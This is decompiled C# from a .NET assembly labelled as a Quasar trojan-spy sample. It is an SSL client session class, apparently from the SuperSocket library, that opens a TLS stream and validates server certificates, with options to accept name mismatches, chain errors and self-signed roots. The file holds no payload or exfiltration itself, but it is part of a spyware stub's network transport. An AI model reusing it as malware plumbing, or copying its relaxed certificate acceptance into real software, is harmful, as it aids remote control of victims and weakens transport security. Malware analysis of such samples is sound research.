// Decompiled with JetBrains decompiler
// Type: NoiseMe.Drags.App.Models.SuperSocket.ClientEngine.SslStreamTcpSession
// Assembly: Stubv2.0, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: E945C042-2241-44AF-B826-4AD3FC72B170
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2021.03-msil\HEUR-Trojan-Spy.MSIL.Quasar.gen-a3f98ee0a78f039e0a9ea52dba13c713dc46f749512bd7d108cc9c05f57fc93d.exe

using System;
using System.IO;
using System.Net;
using System.Net.Security;
using System.Net.Sockets;
using System.Security.Cryptography.X509Certificates;

namespace NoiseMe.Drags.App.Models.SuperSocket.ClientEngine
{
  public class SslStreamTcpSession : AuthenticatedStreamTcpSession
  {
    protected override void StartAuthenticatedStream(Socket client)
    {
      SecurityOption security = this.Security;
      if (security == null)
        throw new Exception("securityOption was not configured");
      SslStream asyncState = new SslStream((Stream) new NetworkStream(client), false, new RemoteCertificateValidationCallback(this.ValidateRemoteCertificate));
      asyncState.BeginAuthenticateAsClient(this.HostName, security.Certificates, security.EnabledSslProtocols, false, new AsyncCallback(this.OnAuthenticated), (object) asyncState);
    }

    private void OnAuthenticated(IAsyncResult result)
    {
      if (!(result.AsyncState is SslStream asyncState))
      {
        this.EnsureSocketClosed();
        this.OnError((Exception) new NullReferenceException("Ssl Stream is null OnAuthenticated"));
      }
      else
      {
        try
        {
          asyncState.EndAuthenticateAsClient(result);
        }
        catch (Exception ex)
        {
          this.EnsureSocketClosed();
          this.OnError(ex);
          return;
        }
        this.OnAuthenticatedStreamConnected((AuthenticatedStream) asyncState);
      }
    }

    private bool ValidateRemoteCertificate(
      object sender,
      X509Certificate certificate,
      X509Chain chain,
      SslPolicyErrors sslPolicyErrors)
    {
      RemoteCertificateValidationCallback validationCallback = ServicePointManager.ServerCertificateValidationCallback;
      if (validationCallback != null)
        return validationCallback(sender, certificate, chain, sslPolicyErrors);
      if (sslPolicyErrors == SslPolicyErrors.None)
        return true;
      if (this.Security.AllowNameMismatchCertificate)
        sslPolicyErrors &= ~SslPolicyErrors.RemoteCertificateNameMismatch;
      if (this.Security.AllowCertificateChainErrors)
        sslPolicyErrors &= ~SslPolicyErrors.RemoteCertificateChainErrors;
      if (sslPolicyErrors == SslPolicyErrors.None)
        return true;
      if (!this.Security.AllowUnstrustedCertificate)
      {
        this.OnError(new Exception(sslPolicyErrors.ToString()));
        return false;
      }
      if (sslPolicyErrors != SslPolicyErrors.None && sslPolicyErrors != SslPolicyErrors.RemoteCertificateChainErrors)
      {
        this.OnError(new Exception(sslPolicyErrors.ToString()));
        return false;
      }
      if (chain != null && chain.ChainStatus != null)
      {
        foreach (X509ChainStatus chainStatu in chain.ChainStatus)
        {
          if ((!(certificate.Subject == certificate.Issuer) || chainStatu.Status != X509ChainStatusFlags.UntrustedRoot) && chainStatu.Status != X509ChainStatusFlags.NoError)
          {
            this.OnError(new Exception(sslPolicyErrors.ToString()));
            return false;
          }
        }
      }
      return true;
    }
  }
}
